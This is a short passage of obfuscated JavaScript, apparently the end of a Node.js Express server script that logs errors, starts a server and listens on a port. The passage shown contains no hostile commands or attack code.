AddVisitTask();}catch(_0x52f1db){console['error'](_0x4f7844(0x1f1),_0x52f1db);}}startserver()['catch'](_0x1ac324=>{const _0x45828c=_0x3262e6;console[_0x45828c(0x16f)](_0x45828c(0x201),_0x1ac324);}),app[_0x3262e6(0x163)](PORT,()=>console[_0x3262e6(0x17b)](_0x3262e6(0x180)+PORT+'!'));
